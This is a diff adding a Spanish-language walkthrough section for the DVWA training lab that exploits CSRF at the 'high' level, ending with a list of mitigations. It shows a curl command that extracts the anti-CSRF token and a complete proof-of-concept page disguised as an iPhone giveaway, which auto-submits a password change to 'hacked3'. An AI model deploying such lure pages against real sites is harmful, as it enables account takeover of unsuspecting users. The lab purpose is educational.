@@ -441,11 +441,96 @@ Necesitamos:
 
 - Requiere que el atacante lo obtenga y lo incluya en el ataque.
 
-## Observamos el token en el formulario
+## 🛠️ Observamos el token en el formulario
 
 ```bash
 curl -s "http://127.0.0.1:8080/vulnerabilities/csrf/" \
   --cookie "PHPSESSID=TU_SESION; security=high" | \
   grep -Eo 'name="user_token" value="[^"]+"'
 ```
+
+O, de manera manual, en el navegador pulsamos Ctrl + U y se abrirá el código fuente de la página y buscamos:
+
+```html
+<input type="hidden" name="user_token" value="abc123xyz">
+```
+
+<img width="647" height="143" alt="imagen" src="https://github.com/user-attachments/assets/14584a99-9919-4ab4-a3ec-b56abe81ce53" />
+
+Copiamos el valor del token para posteriormente utilizarlo.
+
+## 🧨 Creamos el PoC HTML
+
+Guardamos el archivo como dvwa_csrf_high_poc.html:
+
+```html
+  GNU nano 8.4                                  dvwa_csrf_high_poc.html                                            
+<!DOCTYPE html>
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>¡Gana un iPhone 15!</title>
+    <style>
+      body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+      .card { border: 1px solid #ccc; padding: 20px; width: 300px; margin: auto; box-shadow: 2px 2px 10px #aaa; }
+      .card img { width: 100%; }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/IPhone_15_Pro_vector.svg/800px-IPhone_15>
+      <h2>¡Participa en el sorteo!</h2>
+      <p>Solo por visitar esta página, entras en el sorteo de un iPhone 15.</p>
+    </div>
+
+    <form action="http://127.0.0.1:8080/vulnerabilities/csrf/" method="GET">
+  <input type="hidden" name="password_new" value="hacked3">
+  <input type="hidden" name="password_conf" value="hacked3">
+  <input type="hidden" name="Change" value="Change">
+  <input type="hidden" name="user_token" value="4c55822e3cfdc291b693dcd8a2519a2b">
+  <input type="submit" value="¡Gana un iPhone!">
+    </form>
+
+
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+Recuerda usar el valor del token real de tu web y ponerlo en la línea de:  <input type="hidden" name="user_token" value="d68c51a2a2eb44b3ec64c3082a8ac230">
+
+## 🌐 Servimos la página
+
+```bash
+cd ~/Pentesting/DVWA/exploits
+python3 -m http.server 9000
+```
+
+<img width="485" height="62" alt="imagen" src="https://github.com/user-attachments/assets/d951eaa5-1733-4784-96a3-e3f5feab4be2" />
+
+
+Y visitamos en el navegador:
+
+```codigo
+http://127.0.0.1:8080/dvwa_csrf_high_poc.html
+```
+
+<img width="631" height="263" alt="imagen" src="https://github.com/user-attachments/assets/067d7612-321a-41f8-a56f-78f1e0c40534" />
+
+Como observamos, la contraseña ha sido también modificada en High.
+
+
+## ✅ Mitigaciones
+
+- Tokens anti-CSRF impredecibles, por solicitud/sesión; invalidar al usarlos.
+- SmaeSite cookies (Lax o Strict) + Secure y HttpOnly donde aplique.
+- Acciones de estado solo por POST/PUT, nunca por GET.
+- Validación de Origin/Referer como capa adicional (no única).
+- Re-autenticación/MFA para acciones sensibles.
+- CSP y reducción de superficies de ataque (no evita CSRF, pero ayuda contra XSS que podría robar tokens).
+- Rotar tokens y invalidar el logout.
+
+
 
